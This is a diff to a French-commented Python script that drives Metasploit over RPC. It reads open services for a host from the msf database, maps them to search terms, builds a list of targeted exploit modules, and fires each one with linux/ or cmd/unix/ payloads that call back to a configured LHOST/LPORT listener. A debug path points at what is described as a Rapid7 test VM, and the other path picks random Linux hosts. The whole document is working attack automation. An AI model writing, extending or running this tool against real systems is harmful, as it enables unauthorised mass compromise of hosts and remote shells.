@@ -90,6 +90,92 @@ def is_postgres_ready(ip):
         print(f"[ERREUR] Vérification PostgreSQL échouée : {e}")
         return False
 
+# Mapping service → termes de recherche msf
+SERVICE_EXPLOIT_MAP = {
+    'ftp':          ['ftp'],
+    'ssh':          ['ssh'],
+    'telnet':       ['telnet'],
+    'smtp':         ['smtp'],
+    'http':         ['http', 'tomcat', 'apache'],
+    'https':        ['http', 'ssl'],
+    'mysql':        ['mysql'],
+    'postgresql':   ['postgres'],
+    'vnc':          ['vnc'],
+    'java-rmi':     ['java_rmi'],
+    'netbios-ssn':  ['samba', 'smb'],
+    'microsoft-ds': ['samba', 'smb'],
+    'irc':          ['irc', 'unreal'],
+    'ajp13':        ['ajp', 'tomcat'],
+    'rpcbind':      ['nfs'],
+    'x11':          ['x11'],
+    'domain':       ['dns'],
+    'exec':         ['rsh'],
+    'login':        ['rlogin'],
+    'bindshell':    ['bindshell'],
+}
+
+PORT_SERVICE_MAP = {
+    21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'domain',
+    80: 'http', 139: 'netbios-ssn', 443: 'https', 445: 'microsoft-ds',
+    1099: 'java-rmi', 1524: 'bindshell', 2121: 'ftp', 3306: 'mysql',
+    5432: 'postgresql', 5900: 'vnc', 6000: 'x11', 6667: 'irc',
+    8009: 'ajp13', 8180: 'http',
+}
+
+
+def get_host_services_by_address(address):
+    """Récupère les services ouverts pour une IP depuis msf.services."""
+    try:
+        with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD, host=PG_HOST) as conn:
+            with conn.cursor() as cur:
+                cur.execute(
+                    "SELECT s.port, s.name FROM services s "
+                    "JOIN hosts h ON h.id = s.host_id "
+                    "WHERE host(h.address::inet) = %s AND s.state = 'open';",
+                    (str(address),)
+                )
+                return cur.fetchall()
+    except psycopg2.Error as e:
+        print(f"[ERREUR] Récupération services {address}: {e}")
+        return []
+
+
+def build_targeted_exploits(client, services):
+    """
+    Construit une liste d'exploits ciblés basée sur les services découverts.
+    Retourne une liste dédupliquée de modules exploit.
+    """
+    search_terms = set()
+    for port, svc_name in services:
+        svc = (svc_name or '').lower()
+        if svc in SERVICE_EXPLOIT_MAP:
+            for term in SERVICE_EXPLOIT_MAP[svc]:
+                search_terms.add(term)
+        elif port in PORT_SERVICE_MAP:
+            mapped = PORT_SERVICE_MAP[port]
+            if mapped in SERVICE_EXPLOIT_MAP:
+                for term in SERVICE_EXPLOIT_MAP[mapped]:
+                    search_terms.add(term)
+
+    if not search_terms:
+        print("[WARN] Aucun service mappé, fallback sur 'linux'")
+        search_terms = {'linux'}
+
+    print(f"[INFO] Termes de recherche: {sorted(search_terms)}")
+
+    seen = set()
+    exploits = []
+    for term in sorted(search_terms):
+        for mod in client.modules.search(term):
+            name = mod.get('fullname', '')
+            if name and name not in seen:
+                seen.add(name)
+                exploits.append(mod)
+
+    print(f"[INFO] {len(exploits)} exploits uniques pour les services découverts")
+    return exploits
+
+
 # Récupérer l'hôte de debug depuis host_debug (VM Rapid7 de test)
 def get_debug_host():
     try:
@@ -181,7 +267,9 @@ def main():
     else:
         print("[WARN] LHOST non défini, listener non démarré")
 
-    search_results = client.modules.search('linux')
+    if not DEBUG_MODE:
+        search_results = client.modules.search('linux')
+
     while True:
 
      console_id = client.consoles.console().cid
@@ -192,25 +280,31 @@ def main():
              print("[DEBUG] Aucun hôte dans host_debug. Créer la table et insérer l'IP cible.")
              return
          print(f"[DEBUG] Mode debug actif — cible fixe : {host}")
+         services = get_host_services_by_address(str(host))
+         if not services:
+             print(f"[DEBUG] Aucun service connu pour {host} — attendre scan bm12, retry dans 30s...")
+             time.sleep(30)
+             continue
+         print(f"[DEBUG] {len(services)} services: {[(p, s) for p, s in services]}")
+         search_results = build_targeted_exploits(client, services)
+         min_date = "2000-01-01"
      else:
          host_id, host = get_random_host('Linux')
+         min_date = "2021-01-01"
+
      if not host:
          print("[INFO] Aucun hôte disponible.")
          return
- 
+
      print(f"[INFO] Scan de {host} en cours...")
-#  Afficher les résultats de la recherche
 
-
-
-
-     for index in range (1, len(search_results)):
+     for index in range(1, len(search_results)):
         if (search_results[index]['type'] != 'exploit'):
-            print('+',end ="")
+            print('+', end="")
             continue
 
-        if (search_results[index]['disclosuredate'] < "2021-01-01" ):
-            print('+',end ="")
+        if (search_results[index]['disclosuredate'] < min_date):
+            print('+', end="")
             continue
 
         try:
@@ -252,13 +346,16 @@ def main():
 
 #        print (exploit.runoptions)
 #        print (f" payload {payload}")
-        payload = [p for p in payload if p.startswith('linux/')]
+        payload = [p for p in payload if p.startswith('linux/') or p.startswith('cmd/unix/')]
         if (len (payload) > 0):
           if ( MODE_RUN == 1 ):
             for index1 in range(0, len(payload)):
               print (f"{search_results[index]['fullname']} payload {payload[index1]}", end='')
               try:
-                  console.run_module_with_output(exploit, payload[index1])
+                  payload_obj = client.modules.use('payload', payload[index1])
+                  payload_obj['LHOST'] = LHOST
+                  payload_obj['LPORT'] = LPORT
+                  console.run_module_with_output(exploit, payload_obj)
                   print (": Ok")
               except Exception as e:
                   print (f": {type(e).__name__}: {e}")
